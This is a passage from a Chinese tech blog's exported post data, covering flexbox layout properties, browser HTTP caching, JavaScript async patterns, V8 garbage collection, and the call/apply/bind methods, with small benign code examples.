justify-content属性定义了项目在主轴上的对齐方式。 它可取5个值，具体对齐方式与轴的方向有关。下面假设主轴为从左到右。 1）flex-start（默认值）：左对齐 2）flex-end：右对齐 3）center： 居中 4）space-between：两端对齐，项目之间的间隔都相等。 5）space-around：每个项目两侧的间隔相等。所以，项目之间的间隔比项目与边框的间隔大一倍。 5、align-items属性： align-items属性定义项目在交叉轴上如何对齐。 它可取5个值。具体的对齐方式与交叉轴的方向有关，下面假设交叉轴从上到下。 1）flex-start：交叉轴的起点对齐。 2）flex-end：交叉轴的终点对齐。 3）center：交叉轴的中点对齐。 4）baseline: 项目的第一行文字的基线对齐。 5）stretch（默认值）：如果项目未设置高度或设为auto，将占满整个容器的高度。 6、align-content属性： align-content属性定义了多根轴线的对齐方式。如果项目只有一根轴线，该属性不起作用。 它可取6个值。 1）flex-start：与交叉轴的起点对齐。 2）flex-end：与交叉轴的终点对齐。 3）center：与交叉轴的中点对齐。 4）space-between：与交叉轴两端对齐，轴线之间的间隔平均分布。 5）space-around：每根轴线两侧的间隔都相等。所以，轴线之间的间隔比轴线与边框的间隔大一倍。 6）stretch（默认值）：轴线占满整个交叉轴。 五、项目的属性 以下6个属性设置在项目上：order、flex-grow、flex-shrink、flex-basis、flex、align-self 1、order属性： order属性定义项目的排列顺序。数值越小，排列越靠前，默认为0。 2、flex-grow属性： flex-grow属性定义项目的放大比例，默认为0，即如果存在剩余空间，也不放大。 3、flex-shrink属性： flex-shrink属性定义了项目的缩小比例，默认为1，即如果空间不足，该项目将缩小。 4、flex-basis属性： flex-basis属性定义了在分配多余空间之前，项目占据的主轴空间（main size）。浏览器根据这个属性，计算主轴是否有多余空间。它的默认值为auto，即项目的本来大小。 5、flex属性： flex属性是flex-grow, flex-shrink 和 flex-basis的简写，默认值为0 1 auto。后两个属性可选。 你可以认为 flex 属性就是定义了每个孩子分隔父容器宽度的比例。 比如容器 200px，三个孩子设置了 flex 分别是 1-2-1，那么他们实际上宽度是 50px 100px 50px。 强烈建议用这个属性，而不是分别设定三个属性，因为这个属性可以“聪明地”设定三个属性来达到你要的效果，会自动计算 flex-basis 属性的值，如果人工算太麻烦（看下）： 12345678910111213141516171819202122比如容器宽度为 200px，然后你给三个孩子分别设置了.item1 &#123; flex: 1;&#125;.item2 &#123; flex: 2;&#125;.item3 &#123; flex: 1;&#125;那么他们的宽度将是 50-100-50如果你想单独设置每一个孩子的三个属性，你会发现竟然无法按照 1-2-1 的比例平分了。因为flexbox的计算每个孩子的宽度分两部分：1，计算出孩子本身的宽度2，将剩余的空白按比例平分给每一个孩子。所以你如果这样定义：.item1 &#123; flex-grow: 1;flex-shrink:1;&#125;.item2 &#123; flex-grow: 2;flex-shrink:2;&#125;.item3 &#123; flex-grow: 1;flex-shrink:1;&#125;你会发现孩子不是 50-100-50 的宽度，因为他们是按照 1-2-1 平分了剩余的空白。假设每个孩子本身是 20px 宽度，那么这么定义之后，他们其实按 1-2-1 平分了 140px 的空白。加上自身宽度之后比例 显然不是 1-2-1。所以你还需要把它们的flex-basis也设置成 1-2-2，这么写才行：.item1 &#123; flex-grow: 1;flex-shrink:1;flex-basis: 20px;&#125;.item2 &#123; flex-grow: 2;flex-shrink:2;flex-basis: 40px;&#125;.item3 &#123; flex-grow: 1;flex-shrink:1;flex-basis: 20px;&#125;而这样就很麻烦，不如直接用 flex 属性来定义。而事实上，你可以认为 flex 属性就是帮你做了上面的计算。 6、align-self属性： align-self属性允许单个项目有与其他项目不一样的对齐方式，可覆盖align-items属性。默认值为auto，表示继承父元素的align-items属性，如果没有父元素，则等同于stretch。 六、实例之骰子的布局 骰子的一面，最多可以放置9个点: 如果不加说明，本节的HTML模板一律如下： 1234567&lt;div class=\"box\"&gt; &lt;span class=\"item\"&gt;&lt;/span&gt;&lt;/div&gt;上面代码中，div元素（代表骰子的一个面）是Flex容器，span元素（代表一个点）是Flex项目,如果有多个项目，就要添加多个span元素，以此类推。 1、单项目： 2、双项目： 3、三项目： 4、四项目： 5、六项目： 6、九项目： 七、实例之网格布局 1、基本网格布局 最简单的网格布局，就是平均分布。在容器里面平均分配空间，需要设置项目的自动缩放。 2、百分比布局 某个网格的宽度为固定的百分比，其余网格平均分配剩余的空间。 八、实例之圣杯布局 圣杯布局（Holy Grail Layout）是一种常见的网站布局。页面从上到下，分成三个部分：头部（header），躯干（body），尾部（footer）。其中躯干又水平分成三栏，从左到右为：导航、主栏、副栏。 九、实例之输入框的布局 我们常需要在输入框的前方添加提示，后方添加按钮。 十、实例之悬挂式布局 有时，主栏的左侧或右侧，需要添加一个图片栏。 十一、实例之固定的底栏 有时，页面内容太少，无法占满一屏的高度，底栏就会抬高到页面的中间。这时可以采用Flex布局，让底栏总是出现在页面的底部。 十二、实例之流式布局 每行的项目数固定，会自动分行。 标注： 参考资料：http://www.ruanyifeng.com/blog/2015/07/flex-examples.html","categories":[{"name":"前端","slug":"前端","permalink":"http://liuxuewen-site.github.io/categories/前端/"}],"tags":[{"name":"前端-CSS","slug":"前端-CSS","permalink":"http://liuxuewen-site.github.io/tags/前端-CSS/"}]},{"title":"浏览器缓存机制","slug":"network-bs-cache","date":"2018-03-12T06:38:49.000Z","updated":"2019-01-25T10:15:10.862Z","comments":true,"path":"2018/03/12/network-bs-cache/","link":"","permalink":"http://liuxuewen-site.github.io/2018/03/12/network-bs-cache/","excerpt":"","text":"一、什么是浏览器缓存 浏览器缓存就是把一个已经请求过的Web资源（如html页面，图片，js，数据等）拷贝一份副本储存在浏览器中。当下一个请求来到的时候，如果是相同的URL，缓存会根据缓存机制决定是直接使用副本响应访问请求，还是向源服务器再次发送请求。 二、为什么使用缓存 1、减少网络带宽消耗 2、减少网络延迟，加快页面打开速度 3、降低服务器压力 三、浏览器缓存机制 先看一张图： 用文字来描述： 首先，当用户发送一个请求的时候，浏览器会先从浏览器缓存里查找，看是否存在有关于此请求的缓存信息， 若不存在，则直接向服务器请求资源，返回资源后呈现并存入缓存系统， 若存在，则判断缓存是否过期， 若未过期，则使用缓存（到这一步过程称为强制缓存）， 若过期，则向服务器请求，服务器判定是否从缓存中获取资源就好， 若直接从缓存里获取就好，则使用缓存（到这一步过程过程称协商缓存）， 否则，则向服务器请求资源，返回资源后呈现并存入缓存系统。 其中，有两个概念需要说一下： 强缓存：用户发送的请求，直接从客户端缓存中获取，不发送请求到服务器，不与服务器发生交互行为。 协商缓存：用户发送的请求，发送到服务器后，由服务器判定是否从缓存中获取资源。 两者共同点：客户端获得的数据最后都是从客户端缓存中获得。 两者的区别：强缓存不与服务器交互，协商缓存则需要与服务器交互。 再其中，有几个问题需要深究一下： 1、浏览器判定是否有缓存： 浏览器怎么判定是否有缓存，可以转化为浏览器去读取本地放缓存的地方（注：不同浏览器不同系统都会不同），看是否有该请求对应的缓存啦。总结来说就是个查找文件是否存在的问题。 2、缓存是否过期： 在客户端，保留了一个服务器端的response header，里面的Date字段包含了两个字段，expires 跟 Cache-Control。 http1.0的时候，使用的是Expires字段，该字段表示缓存到期时间，即有效时间+当时服务器的时间，比如：Expires: Thu, 10 Nov 2017 08:45:11 GMT。该时间是一个绝对时间。服务器将这个时间设置在header中返回给客户端，告诉浏览器在这个时间未过期之前不需要再次请求。 但是，这个字段设置时有缺点：由于是绝对时间，若服务器时间与客户端时间的不一致，可能导致浏览器判断缓存失效，重新请求该资源。 http1.1的时候，已知Expires的缺点之后，增加了一个字段Cache-Control，该字段表示资源缓存的最大有效时间，比如：Cache-Control: max-age=2592000。该时间是一个相对时间。在该时间内，客户端不需要向服务器发送请求。 所以判断缓存是否过期步骤是： 查看是否有cache-control 的max-age / s-maxage , 如果有，则用date值(header里有个data) + max-age/s-maxage 的秒数计算出新的过期时间，将当前时间与过期时间进行比较，判断是否过期。若无，则用expires作为过期时间判断。 3、跟服务器协商是否使用缓存： 此时涉及到两个字段Last-Modified和If-Modified-Since Last-Modified：请求的资源上次的修改时间。 If-Modified-Since：客户端保留的资源上次的修改时间。 请求时，请求头中带有If-Modified-Since，服务器会将If-Modified-Since的值与Last-Modified字段进行对比，如果相等，则表示未修改，响应304，告知客户端缓存未更新，可继续使用；反之，则表示修改了，响应200状态码，返回数据。 此字段的缺点是如果文件是通过服务器动态生成的，那么该方法的Last-Modified永远是文件生成的时间，尽管文件可能没有变化，所以起不到缓存的作用。 此时有另外两个字段出现，Etag和If-None-Match Etag：资源的内容标识。（不唯一，通常为文件的md5或者一段hash值） If-None-Match：客户端保留的资源内容标识。 请求时，客户端传送If-no-match的字段，服务器将If-no-match与Etag进行比较，如果相等，则表示未修改，响应304；反之，则表示已修改，响应200状态码。 4、浏览器行为引起的不同： 最后，我们来聊聊浏览器行为会引起缓存的变化吧。 1）刷新网页 =&gt; 如果缓存没有失效，浏览器会直接使用缓存；反之，则向服务器请求数据 2）手动刷新（F5） =&gt; 浏览器会认为缓存失效，在请求服务器时加上Cache-Control: max-age=0字段，然后询问服务器数据是否更新。 3）强制刷新（Ctrl + F5） =&gt; 浏览器会直接忽略缓存，在请求服务器时加上Cache-Control: no-cache字段，然后重新向服务器拉取文件。 标注： 参考资料1：https://github.com/laizimo/zimo-article/issues/24 参考资料2：https://www.cnblogs.com/shixiaomiao1122/p/7591556.html","categories":[{"name":"网络协议","slug":"网络协议","permalink":"http://liuxuewen-site.github.io/categories/网络协议/"}],"tags":[{"name":"网络协议","slug":"网络协议","permalink":"http://liuxuewen-site.github.io/tags/网络协议/"}]},{"title":"Javascript异步编程","slug":"JS-bs-async","date":"2018-03-11T09:20:46.000Z","updated":"2019-01-25T10:06:23.474Z","comments":true,"path":"2018/03/11/JS-bs-async/","link":"","permalink":"http://liuxuewen-site.github.io/2018/03/11/JS-bs-async/","excerpt":"","text":"一、异步编程 Javascript语言的执行环境是”单线程”（single thread）。所谓”单线程”，就是指一次只能完成一件任务。如果有多个任务，就必须排队，前面一个任务完成，再执行后面一个任务，以此类推。这种模式的好处是实现起来比较简单，执行环境相对单纯；坏处是只要有一个任务耗时很长，后面的任务都必须排队等着，会拖延整个程序的执行。常见的浏览器无响应（假死），往往就是因为某一段Javascript代码长时间运行（比如死循环），导致整个页面卡在这个地方，其他任务无法执行。 为了解决这个问题，Javascript语言将任务的执行模式分成两种：同步（Synchronous）和异步（Asynchronous）。 “同步模式”就是上述的模式，后一个任务等待前一个任务结束，然后再执行，程序的执行顺序与任务的排列顺序是一致的、同步的； “异步模式”每一个任务有一个或多个回调函数（callback），前一个任务结束后，不是执行后一个任务，而是执行回调函数，后一个任务不是等前一个任务结束就执行，所以程序的执行顺序与任务的排列顺序是不一致的、异步的。 在浏览器端，耗时很长的操作都应该异步执行，避免浏览器失去响应，最好的例子就是Ajax操作。在服务器端，异步模式甚至是唯一的模式，因为执行环境是单线程的，如果允许同步执行所有http请求，服务器性能会急剧下降，很快就会失去响应。 二、异步编程的方法1、回调函数 这是异步编程最基本的方法。假定有两个函数f1和f2。 同步：f2等待f1的执行结果 异步：如果f1是一个很耗时的任务，可以考虑改写f1，把f2写成f1的回调函数 采用这种方式，我们把同步操作变成了异步操作，f1不会堵塞程序运行，相当于先执行程序的主要逻辑，将耗时的操作推迟执行。 回调函数的优点是简单、容易理解和部署，缺点是不利于代码的阅读和维护，各个部分之间高度耦合（Coupling），流程会很混乱，而且每个任务只能指定一个回调函数。 2、事件监听 事件监听是采用事件驱动模式，任务的执行不取决于代码的顺序，而取决于某个事件是否发生。 如（这里采用的jQuery的写法）： 12345678910f1.on('done', f2); //当f1发生done事件，就执行f2改写f1function f1()&#123; setTimeout(function () &#123; // f1的任务代码 f1.trigger('done'); //表示执行完成后，立即触发done事件，从而开始执行f2 &#125;, 1000);&#125; 这种方法的优点是比较容易理解，可以绑定多个事件，每个事件可以指定多个回调函数，而且可以”去耦合”（Decoupling），有利于实现模块化。缺点是整个程序都要变成事件驱动型，运行流程会变得很不清晰。 3、发布/订阅 我们假定，存在一个”信号中心”，某个任务执行完成，就向信号中心”发布”（publish）一个信号，其他任务可以向信号中心”订阅”（subscribe）这个信号，从而知道什么时候自己可以开始执行。这就叫做”发布/订阅模式”（publish-subscribe pattern），又称”观察者模式”（observer pattern）。 如（这种模式有多种实现，下面采用的是Ben Alman的Tiny Pub/Sub – jQuery的一个插件）： 12345678910111213//首先，f2向\"信号中心\"jQuery订阅\"done\"信号。jQuery.subscribe(\"done\", f2);//然后，f1进行如下改写：function f1()&#123; setTimeout(function () &#123; // f1的任务代码 jQuery.publish(\"done\"); //f1执行完成后，向\"信号中心\"jQuery发布\"done\"信号，从而引发f2的执行。 &#125;, 1000); &#125;//f2完成执行后，也可以取消订阅（unsubscribe）。jQuery.unsubscribe(\"done\", f2); 这种方法的性质与”事件监听”类似，但是明显优于后者。因为我们可以通过查看”消息中心”，了解存在多少信号、每个信号有多少订阅者，从而监控程序的运行。 4、Promises对象 Promises对象是CommonJS工作组提出的一种规范，目的是为异步编程提供统一接口。简单说，它的思想是，每一个异步任务返回一个Promise对象，该对象有一个then方法，允许指定回调函数。 比如，f1的回调函数f2,可以写成： 1f1().then(f2); f1要进行如下改写（这里使用的是jQuery的实现）： 12345678function f1()&#123; var dfd = $.Deferred(); setTimeout(function () &#123; // f1的任务代码 dfd.resolve(); &#125;, 500); return dfd.promise; &#125; 这样写的优点在于，回调函数变成了链式写法，程序的流程可以看得很清楚，而且有一整套的配套方法，可以实现许多强大的功能,比如指定多个回调函数【f1().then(f2).then(f3);】，再比如指定发生错误时的回调函数【f1().then(f2).fail(f3);】；另外一个优点是如果一个任务已经完成，再添加回调函数，该回调函数会立即执行。所以，你不用担心是否错过了某个事件或信号。它的缺点就是编写和理解，都相对比较难。 标注： 参考资料1：http://www.ruanyifeng.com/blog/2012/12/asynchronous%EF%BC%BFjavascript.html","categories":[{"name":"前端","slug":"前端","permalink":"http://liuxuewen-site.github.io/categories/前端/"}],"tags":[{"name":"前端-JS","slug":"前端-JS","permalink":"http://liuxuewen-site.github.io/tags/前端-JS/"}]},{"title":"浅谈V8引擎中的垃圾回收机制","slug":"JS-bs-garbage","date":"2018-03-10T09:13:17.000Z","updated":"2019-01-25T10:10:51.217Z","comments":true,"path":"2018/03/10/JS-bs-garbage/","link":"","permalink":"http://liuxuewen-site.github.io/2018/03/10/JS-bs-garbage/","excerpt":"","text":"一、垃圾回收器 JavaScript使用垃圾回收器（机制）来自动管理内存。垃圾回收是一把双刃剑，其好处是可以大幅简化程序的内存管理代码，降低程序员的负担，减少因长时间运转而带来的内存泄露问题。但使用了垃圾回收即意味着程序员将无法掌控内存。ECMAScript没有暴露任何垃圾回收器的接口。我们无法强迫其进行垃圾回收，更无法干预内存管理。 二、内存管理问题 在浏览器中，Chrome V8引擎（JavaScript引擎）实例的生命周期不会很长（毕竟不会一个页面开着几天几个月不关）。而且运行在用户的机器上，如果不幸发生内存泄露等问题，仅仅会影响到一个终端用户。且无论这个V8实例占用了多少内存，最终在关闭页面时内存都会被释放，几乎没有太多内存管理的必要（当然并不代表一些大型Web应用不需要管理内存）。但如果使用Node作为服务器，就需要关注内存问题了，一旦内存发生泄漏，久而久之整个服务将会瘫痪（服务器不会频繁的重启）。 三、V8 的内存限制 存在限制： Node是基于V8构建的，Node与其他语言不同的一个地方，就是其限制了JavaScript所能使用的内存（64位为1.4GB，32位为0.7GB），这也就意味着将无法直接操作一些大内存对象。这很令人匪夷所思，因为很少有其他语言会限制内存的使用。 为何限制： V8之所以限制了内存的大小，表面上的原因是V8最初是作为浏览器的JavaScript引擎而设计，不太可能遇到大量内存的场景，而深层次的原因则是由于V8的垃圾回收机制的限制。V8在执行垃圾回收时会阻塞JavaScript应用逻辑，直到垃圾回收结束再重新执行JavaScript应用逻辑，这种行为被称为“全停顿”（stop-the-world）。若V8的堆内存为1.5GB，V8做一次小的垃圾回收需要50ms以上，做一次非增量式的垃圾回收甚至要1秒以上。这样浏览器将在1s内失去对用户的响应，造成假死现象。如果有动画效果的话，动画的展现也将显著受到影响。 突破限制： 当然这个限制是可以打开的，类似于JVM，我们通过在启动node时可以传递–max-old-space-size或–max-new-space-size来调整内存限制的大小，前者确定老生代的大小，单位为MB，后者确定新生代的大小，单位为KB。这些配置只在V8初始化时生效，一旦生效不能再改变。 四、V8 的堆构成 V8的堆其实并不只是由老生代和新生代两部分构成，可以将堆分为几个不同的区域： * 新生代内存区：大多数的对象被分配在这里，这个区域很小但是垃圾回特别频繁 * 老生代指针区：包含了大多数可能存在指向其他对象的指针的对象，大多数从新生代晋升的对象会被移动到这里 * 老生代数据区：这里只保存原始数据对象，这些对象没有指向其他对象的指针 * 大对象区：这里存放体积超越其他区大小的对象，每个对象有自己的内存，垃圾回收器不会移动大对象 * 代码区：代码对象，也就是包含JIT之后指令的对象，会被分配在这里。唯一拥有执行权限的内存区 * Cell区、属性Cell区、Map区：存放Cell、属性Cell和Map，每个区域都是存放相同大小的元素，结构简单 每个区域都是由一组内存页构成，内存页是V8申请内存的最小单位，除了大对象区的内存页较大以外，其他区的内存页都是1MB大小，而且按照1MB对齐。内存页除了存储的对象，还有一个包含元数据和标识信息的页头，以及一个用于标记哪些对象是活跃对象的位图区。另外每个内存页还有一个单独分配在另外内存区的槽缓冲区，里面放着一组对象，这些对象可能指向其他存储在该页的对象。垃圾回收器只会针对新生代内存区、老生代指针区以及老生代数据区进行垃圾回收。 五、V8 的垃圾回收机制 如何判断回收内容： 如何确定哪些内存需要回收，哪些内存不需要回收，这是垃圾回收期需要解决的最基本问题。 我们可以这样假定，一个对象为活对象当且仅当它被一个根对象或另一个活对象指向。 根对象永远是活对象，它是被浏览器或V8所引用的对象，被局部变量所指向的对象也属于根对象，因为它们所在的作用域对象被视为根对象，全局对象（Node中为global，浏览器中为window）自然是根对象，浏览器中的DOM元素也属于根对象。 如何识别指针和数据： 垃圾回收器需要面临一个问题，它需要判断哪些是数据，哪些是指针。 目前主要有三种方法来识别指针： 1、保守法：将所有堆上对齐的字都认为是指针，那么有些数据就会被误认为是指针。于是某些实际是数字的假指针，会背误认为指向活跃对象，导致内存泄露（假指针指向的对象可能是死对象，但依旧有指针指向——这个假指针指向它）同时我们不能移动任何内存区域。 2、编译器提示法：如果是静态语言，编译器能够告诉我们每个类当中指针的具体位置，而一旦我们知道对象时哪个类实例化得到的，就能知道对象中所有指针。这是JVM实现垃圾回收的方式，但这种方式并不适合JS这样的动态语言 3、标记指针法：这种方法需要在每个字末位预留一位来标记这个字段是指针还是数据。这种方法需要编译器支持，但实现简单，而且性能不错。V8采用的是这种方式。V8将所有数据以32bit字宽来存储，其中最低一位保持为0，而指针的最低两位为01。 V8的回收策略： 自动垃圾回收算法的演变过程中出现了很多算法，但是由于不同对象的生存周期不同，没有一种算法适用于所有的情况。所以V8采用了一种分代回收的策略，将内存分为两个生代：新生代和老生代。新生代的对象为存活时间较短的对象，老生代中的对象为存活时间较长或常驻内存的对象。然后分别对新生代和老生代使用不同的垃圾回收算法来提升垃圾回收的效率。对象起初都会被分配到新生代，当新生代中的对象满足某些条件（后面会有介绍）时，会被移动到老生代（晋升）。 V8的分代内存： 默认情况下，64位环境下的V8引擎的新生代内存大小32MB、老生代内存大小为1400MB，而32位则减半，分别为16MB和700MB。V8内存的最大保留空间分别为1464MB（64位）和732MB（32位）。具体的计算公式是4*reserved_semispace_space_ + max_old_generation_size_，新生代由两块reserved_semispace_space_组成，每块16MB（64位）或8MB（32位）。 六、新生代 新生代的特点： 大多数的对象被分配在这里，这个区域很小但是垃圾回特别频繁。在新生代分配内存非常容易，我们只需要保存一个指向内存区的指针，不断根据新对象的大小进行递增即可。当该指针到达了新生代内存区的末尾，就会有一次清理（仅仅是清理新生代） 新生代的垃圾回收算法： 新生代使用Scavenge算法进行回收。在Scavenge算法的实现中，主要采用了Cheney算法。 Cheney算法是一种采用复制的方式实现的垃圾回收算法。它将内存一分为二，每一部分空间称为semispace。在这两个semispace中，一个处于使用状态，另一个处于闲置状态。处于使用状态的semispace空间称为From空间，处于闲置状态的空间称为To空间，当我们分配对象时，先是在From空间中进行分配。当开始进行垃圾回收算法时，会检查From空间中的存活对象，这些存活对象将会被复制到To空间中（复制完成后会进行紧缩，复制的过程采用的是BFS – 广度优先遍历的思想，从根对象出发，广度优先遍历所有能到达的对象。），而非活跃对象占用的空间将会被释放。完成复制后，From空间和To空间的角色发生对换。也就是说，在垃圾回收的过程中，就是通过将存活对象在两个semispace之间进行复制。可以很容易看出来，使用Cheney算法时，总有一半的内存是空的。但是由于新生代很小，所以浪费的内存空间并不大。而且由于新生代中的对象绝大部分都是非活跃对象，需要复制的活跃对象比例很小，所以其时间效率十分理想。 具体的执行过程大致是这样： 首先将From空间中所有能从根对象到达的对象复制到To区，然后维护两个To区的指针scanPtr和allocationPtr，分别指向即将扫描的活跃对象和即将为新对象分配内存的地方，开始循环。循环的每一轮会查找当前scanPtr所指向的对象，确定对象内部的每个指针指向哪里。如果指向老生代我们就不必考虑它了。如果指向From区，我们就需要把这个所指向的对象从From区复制到To区，具体复制的位置就是allocationPtr所指向的位置。复制完成后将scanPtr所指对象内的指针修改为新复制对象存放的地址，并移动allocationPtr。如果一个对象内部的所有指针都被处理完，scanPtr就会向前移动，进入下一个循环。若scanPtr和allocationPtr相遇，则说明所有的对象都已被复制完，From区剩下的都可以被视为垃圾，可以进行清理了 用图说明： 在执行Scavenge之前，From区长这幅模样: 那么首先按照BFS将根对象能到达的ABC对象复制到To区，于是乎To区就变成了这个样子： 接下来进入循环，扫描scanPtr所指的A对象，发现其没有指针，于是乎scanPtr移动，变成如下这样： 接下来扫描B对象，发现其有指向E对象的指针，且E对象在From区，那么我们需要将E对象复制到allocationPtr所指的地方并移动allocationPtr指针： B对象里所有指针都已被复制完，所以移动scanPtr： 接下来扫描C对象，C对象中有两个指针，分别指向F对象和G对象，且都在From区，先复制F对象到To区： 然后复制G对象到To区： 这样C对象内部的指针已经复制完成了，移动scanPtr： 逐个扫描E，F对象，发现其中都没有指针，移动scanPtr： 扫描G对象，发现其中有一个指向H对象的指针，且H对象在From区，复制H对象到To区，并移动allocationPtr： 完成后由于G对象没有其他指针，且H对象没有指针移动scanPtr： 此时scanPtr和allocationPtr重合，说明复制结束，可以对比一下From区和To区在复制完成后的结果： D对象没有被复制，它将被作为垃圾进行回收。 六、写屏障与对象的晋升 写屏障： 如果新生代中的一个对象只有一个指向它的指针，而这个指针在老生代中，我们如何判断这个新生代的对象是否存活？为了解决这个问题，需要建立一个列表用来记录所有老生代对象指向新生代对象的情况。每当有老生代对象指向新生代对象的时候，我们就记录下来。 对象的晋升： 当一个对象经过多次新生代的清理依旧幸存，这说明它的生存周期较长，也就会被移动到老生代，这称为对象的晋升。具体移动的标准有两种： 1、对象从From空间复制到To空间时，会检查它的内存地址来判断这个对象是否已经经历过一个新生代的清理，如果是，则复制到老生代中，否则复制到To空间中。 2、对象从From空间复制到To空间时，如果To空间已经被使用了超过25%，那么这个对象直接被复制到老生代。 七、老生代 老生代的特点： 老生代所保存的对象大多数是生存周期很长的甚至是常驻内存的对象，而且老生代占用的内存较多。 老生代的垃圾回收算法： 老生代占用内存较多（64位为1.4GB，32位为700MB），如果使用Scavenge算法，浪费一半空间不说，复制如此大块的内存消耗时间将会相当长。所以Scavenge算法显然不适合。V8在老生代中的垃圾回收策略采用Mark-Sweep（标记清除）和Mark-Compact（标记整理）相结合。 Mark-Sweep（标记清除） 标记清除分为标记和清除两个阶段。在标记阶段需要遍历堆中的所有对象，并标记那些活着的对象，然后进入清除阶段。在清除阶段中，只清除没有被标记的对象。由于标记清除只清除死亡对象，而死亡对象在老生代中占用的比例很小，所以效率较高。标记清除有一个问题就是进行一次标记清楚后，内存空间往往是不连续的，会出现很多的内存碎片。如果后续需要分配一个需要内存空间较多的对象时，如果所有的内存碎片都不够用，将会使得V8无法完成这次分配，提前触发垃圾回收。 Mark-Compact（标记整理） 标记整理正是为了解决标记清除所带来的内存碎片的问题。标记整理在标记清除的基础进行修改，将其清除阶段变为紧缩极端。在整理的过程中，将活着的对象向内存区的一段移动，移动完成后直接清理掉边界外的内存。紧缩过程涉及对象的移动，所以效率并不是太好，但是能保证不会生成内存碎片。 结合使用标记清除和标记整理 在 Mark-Sweep 和 Mark-Compact 之间，由于 Mark-Compact 需要移动对象，所以它的执行速度不可能很快，所以在取舍上，V8 主要使用 Mark-Sweep（而非递进使用），在空间不足以对从新生代中晋升过来对象进行分配时才使用 Mark-Compact。 以下是三种算法的对比： 八、V8的优化 Incremental Marking（增量标记）： 由于全停顿会造成了浏览器一段时间无响应，所以V8使用了一种增量标记的方式，将完整的标记拆分成很多部分，每做完一部分就停下来，让JS的应用逻辑执行一会，这样垃圾回收与应用逻辑交替完成。经过增量标记的改进后，垃圾回收的最大停顿时间可以减少到原来的1/6左右 惰性清理： 由于标记完成后，所有的对象都已经被标记，不是死对象就是活对象，堆上多少空间格局已经确定。我们可以不必着急释放那些死对象所占用的空间，而延迟清理过程的执行。垃圾回收器可以根据需要逐一清理死对象所占用的内存页 九、高效使用内存 了解完垃圾回收机制以后，作为开发者的我们要具备的责任就是如何让垃圾回收机制更高效的工作 作用域： 提到如何触发垃圾回收机制，第一个要介绍的是作用域。 在 JavaScript 中能形成作用域的有函数调用、with 以及全局作用域。 如： 123var foo = function() &#123; var local = &#123;&#125;;&#125;; foo()函数在每次被调用时会创建对应的作用域，函数执行结束后，该作用域将会销毁。同时作用域中声明的局部变量会随作用域的销毁而销毁。只被局部变量引用的对象存活周期较短。 在这个示例中，由于对象非常小，将会分配在新生代的 From 空间中。在作用域释放后，局部变量local失效，其引用的对象将会在下次垃圾回收时被释放。 以上就是最基本的内存回收过程。 变量的主动释放： 如果变量是全局变量，由于全局作用域需要知道进程退出才能释放，此时将导致引用的对象常驻内存（常驻在老生代中）。如果需要释放常驻内存的对象，可以通过delete操作来删除引用关系。或者将变量重新赋值，让旧的对象脱离引用关系。在接下来的老生代内存清理和整理的过程中，会被回收释放。 如： 123456789window.foo = \"I am global object\";console.log( global.foo ); // =&gt; \"I am global object\"delete global.foo;// 或者重新赋值global.foo = null; // or undefinedconsole.log(global.foo); // =&gt; null 虽然delete操作和重新赋值具有相同的效果，但是在 V8 中通过delete删除对象的属性有可能干扰 V8 的优化，所以通过赋值方式解除引用会更好。 其他的比如说清除闭包常驻内存的变量，防止内存泄漏等…… 标注： 参考资料1：https://segmentfault.com/a/1190000000440270 参考资料2：http://www.twopointhole.com/article/6","categories":[{"name":"前端","slug":"前端","permalink":"http://liuxuewen-site.github.io/categories/前端/"}],"tags":[{"name":"前端-JS","slug":"前端-JS","permalink":"http://liuxuewen-site.github.io/tags/前端-JS/"}]},{"title":"call()，apply()和bind()","slug":"JS-bs-bind","date":"2018-03-09T07:49:55.000Z","updated":"2019-01-25T10:30:31.351Z","comments":true,"path":"2018/03/09/JS-bs-bind/","link":"","permalink":"http://liuxuewen-site.github.io/2018/03/09/JS-bs-bind/","excerpt":"","text":"一、先来看个例子 比较一下这两者this 的差别，第一个this 指向obj，第二个this 指向window ； 二、call()，apply()，bind() 在 javascript 中，call，apply，bind都是为了改变某个函数运行时的上下文（context）而存在的，换句话说，就是为了改变函数体内部 this 的指向。 比如： 那么，他们间有什么区别呢？ 1、传参方面 从上面四个结果可以看出： call、apply、bind这三个函数的第一个参数都是 this 的指向对象，第二个参数差别就来了： call的参数是直接放进去的，第二第三第n个参数都用逗号分隔，直接放到后面； apply的参数必须放在一个数组里面传进去； bind的参数和call一样。 当然，三者的参数不限定是string类型，允许是各种类型，包括函数、object等。 这里说个注意点，当参数数量是明确的时用call；而不确定的时候用apply，因为可以用伪数组方式，函数内部通过arguments这个伪数组来遍历所有的参数。(关于伪数组arguments见《伪数组》文章) 举个面试题为例子： 第一步：定义一个未定义的log方法，让它可以代理console.log的方法 12345function log(msg) &#123; console.log(msg);&#125;log('hello world') 第二步：改变调用log的方式，传入多个参数，注意传入参数的个数是不定的 当传入参数的个数是不确定的时候，第一步的方法就失效了，这个时候可以考虑使用apply或者 call，注意这里传入参数是不确定的，所以使用apply是最好的，方法如下： 123456function log()&#123; console.log.apply(console, arguments);&#125;log(1); //1log(1,2); //1 2 第三步：给每一个log消息添加一个”(app)”的前辍 其实arguments参数是个伪数组，通过Array.prototype.slice.call可以转化为标准数组，再使用数组方法unshift 123456function log()&#123; var args = Array.prototype.slice.call(arguments); args.unshift('(app)'); console.log.apply(console, args);&#125;; 2、调用方式 从这张图我们可以看到，bind方法后面多了个 ()， 其实，bind是新创建了一个函数，然后把上下文绑定到bind()括号中的参数上，然后将它返回。 也就是说，bind之后，函数不会执行，只是返回一个改变了上下文的函数副本，必须调用它才会被执行。而call和apply是直接执行函数。 这里第一个注意点，连续bind，结果会是怎么样的呢？ 看下面这个例子： 1234567891011121314151617var bar = function()&#123; console.log(this.x);&#125;var foo = &#123; x:3&#125;var sed = &#123; x:4&#125;var func = bar.bind(foo).bind(sed);func(); //3var fiv = &#123; x:5&#125;var func = bar.bind(foo).bind(sed).bind(fiv);func(); //3 可以看到，两次都仍将输出3 ，而非期待中的4和5。原因是，在Javascript中，多次bind() 是无效的。更深层次的原因，bind()的实现，相当于使用函数在内部包了一个call/apply ，第二次bind()相当于再包住第一次bind(),故第二次以后的bind是无法生效的。 这里第二个注意点，自定义bind方法？ 先上代码吧： 12345678910if (!function() &#123;&#125;.bind) &#123; Function.prototype.bind = function(context) &#123; var self = this, args = Array.prototype.slice.call(arguments); return function() &#123; return self.apply(context, args.slice(1)); &#125; &#125;;&#125; 首先，我们判断是否存在bind方法，若不存在，向Function对象的原型中添加自定义的bind方法。 接着，代码中的 var self = this 是什么意思呢？它不是指向prototype，而是指向调用它的对象。 接着，是 Array.prototype.slice.call(arguments) ，它将类数组形式的变量（里面是所有bind里的参数）转化为真正的数组。 